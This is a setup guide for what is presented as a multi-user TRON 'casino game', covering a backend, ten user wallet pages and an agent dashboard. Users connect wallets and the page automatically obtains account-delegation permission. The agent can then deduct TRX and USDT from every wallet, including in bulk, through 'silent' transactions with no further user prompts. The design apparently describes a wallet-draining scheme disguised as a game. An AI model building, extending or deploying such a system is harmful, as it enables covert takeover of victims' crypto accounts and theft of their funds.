# Casino Game Multi-User Setup Guide

This implementation adds support for a casino game with 10 users and 1 agent dashboard.

## Architecture

```
Players (10 devices) → Backend Server → Agent Dashboard (11th device) → Casino Smart Contract
     │                      │                      │
     │ connect wallet       │ websocket updates     │ contract calls
     ▼                      ▼                      ▼
User Pages          WebSocket Server         Agent Dashboard
/user/1-10                                  /agent
```

## Features

### User Pages (`/user/1` through `/user/10`)
- Each user gets a unique URL: `website.com/user/1`, `website.com/user/2`, etc.
- Users can connect wallets via WalletConnect or TronLink
- Automatic delegation permission check and grant
- Real-time balance display (TRX and USDT)
- WebSocket connection for real-time updates

### Agent Dashboard (`/agent`)
- Shows all 10 user cards in a grid layout
- Each card displays:
  - User ID and connection status
  - Wallet address (shortened)
  - TRX and USDT balances
  - Retry permission button (if permission not found)
  - Individual deduction controls (TRX and USDT)
- Top section includes:
  - Agent wallet address display
  - Send money to winner form
  - Bulk deduction button (deducts from all users at once)
- Real-time updates via WebSocket when users connect/disconnect or balances change

## Setup Instructions

### 1. Install Dependencies

```bash
# Root level (backend)
npm install

# Frontend
cd frontend
npm install
```

### 2. Environment Variables

#### Backend (.env in root)
```env
NETWORK=shasta  # or mainnet
FULL_NODE=https://api.shasta.trongrid.io
SOLIDITY_NODE=https://api.shasta.trongrid.io
EVENT_SERVER=https://api.shasta.trongrid.io
TREASURY_ADDRESS=YOUR_TREASURY_ADDRESS
BACKEND_PRIVATE_KEY=YOUR_BACKEND_PRIVATE_KEY
USDT_CONTRACT_SHASTA=TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs
WALLETCONNECT_PROJECT_ID=YOUR_WALLETCONNECT_PROJECT_ID
PORT=8787
```

#### Frontend (.env.local in frontend/)
```env
NEXT_PUBLIC_WS_URL=ws://localhost:8787/ws  # For development
# Or set NEXT_PUBLIC_WS_PORT=8787 to auto-construct URL
```

### 3. Start the Backend Server

```bash
npm run dev
```

The backend will start on port 8787 (or PORT from .env) with:
- HTTP API at `http://localhost:8787/api/*`
- WebSocket server at `ws://localhost:8787/ws`

### 4. Start the Frontend

```bash
cd frontend
npm run dev
```

The frontend will start on port 3000 (default Next.js port).

### 5. Access the Application

- **User Pages**: `http://localhost:3000/user/1` through `http://localhost:3000/user/10`
- **Agent Dashboard**: `http://localhost:3000/agent`

## API Endpoints

### New Endpoints

- `POST /api/user/register` - Register a user with userId
  ```json
  {
    "address": "T...",
    "permissionId": 2,
    "userId": "1"
  }
  ```

- `GET /api/user/balances?address=T...` - Get user balances
  ```json
  {
    "trxBalance": "100.000000",
    "usdtBalance": "50.00"
  }
  ```

- `POST /api/deduct/bulk/usdt` - Bulk deduct from multiple users
  ```json
  {
    "users": [
      { "address": "T...", "permissionId": 2 },
      { "address": "T...", "permissionId": 2 }
    ],
    "amount": 1000000,
    "toAddress": "T..."
  }
  ```

- `POST /api/send/usdt` - Send USDT from agent wallet to winner
  ```json
  {
    "toAddress": "T...",
    "amount": 1000000
  }
  ```

## WebSocket Events

### Client → Server

- `{ type: "register", role: "user", userId: "1" }` - Register as user
- `{ type: "register", role: "agent" }` - Register as agent
- `{ type: "user_connected", userId: "1", address: "T...", permissionId: 2 }` - Notify user connected
- `{ type: "balance_update", userId: "1", address: "T...", trxBalance: "100", usdtBalance: "50" }` - Update balance
- `{ type: "get_users" }` - Request users list (agent only)

### Server → Client

- `{ type: "users_list", users: [...] }` - List of all connected users
- `{ type: "user_connected", userId: "1", address: "T...", permissionId: 2 }` - User connected notification
- `{ type: "user_disconnected", userId: "1" }` - User disconnected notification
- `{ type: "balance_update", userId: "1", trxBalance: "100", usdtBalance: "50" }` - Balance update

## Usage Flow

1. **Agent Setup**: Agent opens `/agent` page on the 11th device
2. **User Connection**: Each user (1-10) opens their respective `/user/[id]` page
3. **Wallet Connection**: Users connect wallets and grant delegation permission
4. **Real-time Updates**: Agent dashboard automatically shows user cards as they connect
5. **Game Actions**:
   - Agent can deduct entry fees individually or in bulk
   - Agent can send winnings to winner's address
   - All transactions are silent (no user popups after initial delegation)

## Notes

- The backend store is in-memory. For production, replace with a database (Redis/PostgreSQL)
- WebSocket connections are managed per role (user/agent)
- Users are tracked by userId (1-10) and wallet address
- All silent transactions use the delegated permission mechanism
- The agent wallet (treasury) is used for sending winnings

## Troubleshooting

1. **WebSocket not connecting**: Check `NEXT_PUBLIC_WS_URL` or `NEXT_PUBLIC_WS_PORT` in frontend .env
2. **Users not appearing on agent dashboard**: Ensure WebSocket is connected and users have registered
3. **Deduction failing**: Verify user has granted delegation permission and is registered
4. **Send money failing**: Check agent wallet has sufficient USDT balance

